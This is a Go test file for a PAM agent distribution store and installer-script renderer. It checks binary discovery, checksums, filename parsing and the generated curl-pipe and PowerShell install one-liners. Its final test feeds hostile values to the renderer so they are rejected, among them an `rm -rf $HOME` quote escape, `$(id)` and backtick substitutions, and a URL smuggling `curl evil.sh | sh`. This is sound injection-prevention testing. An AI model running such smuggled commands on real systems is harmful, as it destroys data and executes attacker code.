// pam/internal/agentdist/store_test.go
package agentdist

import (
	"crypto/sha256"
	"encoding/hex"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"go.uber.org/zap"
)

func writeFile(t *testing.T, dir, name, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
		t.Fatalf("write %s: %v", name, err)
	}
}

func TestStoreDiscoversTargetsAndHashesThem(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "pam-agent_windows_amd64.exe", "windows-binary")
	writeFile(t, dir, "pam-agent_darwin_arm64", "darwin-arm-binary")
	writeFile(t, dir, "pam-agent_linux_amd64", "linux-binary")
	writeFile(t, dir, "VERSION", "1.2.3\n")
	// Noise that must not break the scan: a stray file in the release
	// directory should cost that file, not every platform.
	writeFile(t, dir, "README.md", "notes")
	writeFile(t, dir, "pam-agent_malformed", "nope")

	s := NewStore(dir, zap.NewNop())
	if !s.Enabled() {
		t.Fatal("store with three binaries reports disabled")
	}

	targets := s.Targets()
	if len(targets) != 3 {
		t.Fatalf("found %d targets, want 3: %+v", len(targets), targets)
	}

	// Sorted, so the console's platform list does not shuffle between calls.
	got := make([]string, 0, len(targets))
	for _, tg := range targets {
		got = append(got, tg.OS+"/"+tg.Arch)
	}
	want := "darwin/arm64,linux/amd64,windows/amd64"
	if strings.Join(got, ",") != want {
		t.Fatalf("target order = %v, want %s", got, want)
	}

	win, ok := s.Lookup("windows", "amd64")
	if !ok {
		t.Fatal("windows/amd64 not found")
	}
	sum := sha256.Sum256([]byte("windows-binary"))
	if win.SHA256 != hex.EncodeToString(sum[:]) {
		t.Fatalf("sha256 = %q, want the digest of the file's actual bytes", win.SHA256)
	}
	if win.Version != "1.2.3" {
		t.Fatalf("version = %q, want 1.2.3 from the VERSION file", win.Version)
	}
	if win.Label != "Windows (64-bit)" {
		t.Fatalf("label = %q; the console shows this to a human", win.Label)
	}
	if win.Size != int64(len("windows-binary")) {
		t.Fatalf("size = %d, want %d", win.Size, len("windows-binary"))
	}

	// Apple silicon vs Intel is the distinction operators get wrong most
	// often, so both must be named explicitly rather than by Go arch.
	mac, _ := s.Lookup("darwin", "arm64")
	if mac.Label != "macOS (Apple Silicon)" {
		t.Fatalf("darwin/arm64 label = %q, want the Apple Silicon wording", mac.Label)
	}
}

func TestStoreIsDisabledWithoutADirectory(t *testing.T) {
	s := NewStore("", zap.NewNop())
	if s.Enabled() {
		t.Fatal("an unconfigured store must report disabled")
	}
	if len(s.Targets()) != 0 {
		t.Fatal("an unconfigured store must offer no targets")
	}
	if _, ok := s.Lookup("windows", "amd64"); ok {
		t.Fatal("an unconfigured store must resolve nothing")
	}
}

// A directory that exists but holds nothing usable is the same situation as
// no directory: the console must show manual instructions, not a dead button.
func TestStoreWithNoUsableBinariesIsDisabled(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "notes.txt", "hello")

	s := NewStore(dir, zap.NewNop())
	if s.Enabled() {
		t.Fatal("a directory with no agent binaries must report disabled")
	}
}

func TestOpenStreamsTheRequestedBinary(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "pam-agent_linux_arm64", "arm64-payload")

	s := NewStore(dir, zap.NewNop())
	rc, target, err := s.Open("linux", "arm64")
	if err != nil {
		t.Fatalf("Open: %v", err)
	}
	defer rc.Close()

	body, err := io.ReadAll(rc)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if string(body) != "arm64-payload" {
		t.Fatalf("streamed %q, want the file's contents", body)
	}
	if target.Size != int64(len("arm64-payload")) {
		t.Fatalf("target size %d does not match the streamed length %d", target.Size, len(body))
	}

	if _, _, err := s.Open("plan9", "mips"); err == nil {
		t.Fatal("Open must fail for a platform with no build")
	}
}

func TestParseNameAcceptsOnlyTheAgreedFilenameShape(t *testing.T) {
	// This shape is a contract with install/build-release.sh, not a
	// convention: the server derives its whole target list from it.
	cases := []struct {
		name     string
		os, arch string
		ok       bool
	}{
		{"pam-agent_windows_amd64.exe", "windows", "amd64", true},
		{"pam-agent_darwin_arm64", "darwin", "arm64", true},
		{"pam-agent_LINUX_AMD64", "linux", "amd64", true},
		{"pam-agent_linux", "", "", false},
		{"pam-agent_linux_amd64_extra", "", "", false},
		{"pamagent_linux_amd64", "", "", false},
		{"VERSION", "", "", false},
		{"", "", "", false},
	}
	for _, tc := range cases {
		goos, arch, ok := parseName(tc.name)
		if ok != tc.ok || goos != tc.os || arch != tc.arch {
			t.Fatalf("parseName(%q) = (%q, %q, %v), want (%q, %q, %v)",
				tc.name, goos, arch, ok, tc.os, tc.arch, tc.ok)
		}
	}
}

// ── Installer rendering ──────────────────────────────────────────────────

func testBootstrap(goos string) Bootstrap {
	return Bootstrap{
		ServerURL:   "https://pam.example.com",
		PairingCode: "ABCD1234",
		BinaryURL:   "https://pam.example.com/api/v1/pam/agent/install/binary/" + goos + "/amd64?t=ABCD1234",
		SHA256:      "deadbeef",
		ExpiresAt:   "2026-01-01 00:00:00 UTC",
		Target:      Target{OS: goos, Arch: "amd64"},
	}.WithScriptURL("https://pam.example.com/api/v1/pam/agent/install/script?os=" + goos + "&arch=amd64&t=ABCD1234")
}

func TestRenderedUnixInstallerDoesTheWholeJob(t *testing.T) {
	s, err := Render(testBootstrap("linux"))
	if err != nil {
		t.Fatalf("Render: %v", err)
	}

	// The four things that make this one-click rather than a download link.
	for _, want := range []string{
		"pair --code", // pairs without prompting
		"install",     // registers the pam-agent:// handler
		"deadbeef",    // verifies what it downloaded
		"ABCD1234",    // carries the one-time code
	} {
		if !strings.Contains(s.Body, want) {
			t.Fatalf("installer is missing %q:\n%s", want, s.Body)
		}
	}
	if !strings.Contains(s.Command, "curl") || !strings.Contains(s.Command, "| sh") {
		t.Fatalf("unix one-liner = %q, want a curl pipe", s.Command)
	}
	if s.Filename != "pam-agent-install.sh" {
		t.Fatalf("filename = %q", s.Filename)
	}
	// Refusing to run an unverified binary is the whole reason the digest is
	// in there; a script that only warns would be worse than useless.
	if !strings.Contains(s.Body, "Refusing to install an unverified agent binary") {
		t.Fatal("the installer must abort, not warn, when it cannot verify the download")
	}
}

func TestRenderedWindowsInstallerDoesTheWholeJob(t *testing.T) {
	s, err := Render(testBootstrap("windows"))
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	for _, want := range []string{"pair --code", "Get-FileHash", "deadbeef", "ABCD1234"} {
		if !strings.Contains(s.Body, want) {
			t.Fatalf("installer is missing %q", want)
		}
	}
	if !strings.Contains(s.Command, "powershell") || !strings.Contains(s.Command, "iex") {
		t.Fatalf("windows one-liner = %q", s.Command)
	}
	if s.Filename != "pam-agent-install.ps1" {
		t.Fatalf("filename = %q", s.Filename)
	}
	// -ExecutionPolicy Bypass scoped to the process: without it the default
	// policy on a managed Windows build blocks a downloaded script outright.
	if !strings.Contains(s.Command, "-ExecutionPolicy Bypass") {
		t.Fatal("the Windows one-liner needs a process-scoped execution policy or it is blocked")
	}
}

// The rendered output is a shell script, so any value interpolated into it is
// an injection vector — and the result is handed to an operator to run with
// their own privileges. A code containing a quote would close the literal it
// sits in and turn the rest of the line into commands.
func TestRenderRefusesValuesThatCouldEscapeTheScript(t *testing.T) {
	hostile := []string{
		`'; rm -rf $HOME; echo '`,
		"code\nmalicious-command",
		"code`whoami`",
		"code$(id)",
		"a&b",
		"",
	}
	for _, bad := range hostile {
		b := testBootstrap("linux")
		b.PairingCode = bad
		if _, err := Render(b); err == nil {
			t.Fatalf("Render accepted a pairing code that can escape the script: %q", bad)
		}
	}

	// And the same protection on every other interpolated field.
	b := testBootstrap("linux")
	b.SHA256 = "dead;beef"
	if _, err := Render(b); err == nil {
		t.Fatal("Render accepted an unsafe checksum")
	}
	b = testBootstrap("linux")
	b.ServerURL = "https://x.example.com' && curl evil.sh | sh && echo '"
	if _, err := Render(b); err == nil {
		t.Fatal("Render accepted an unsafe server URL")
	}
}
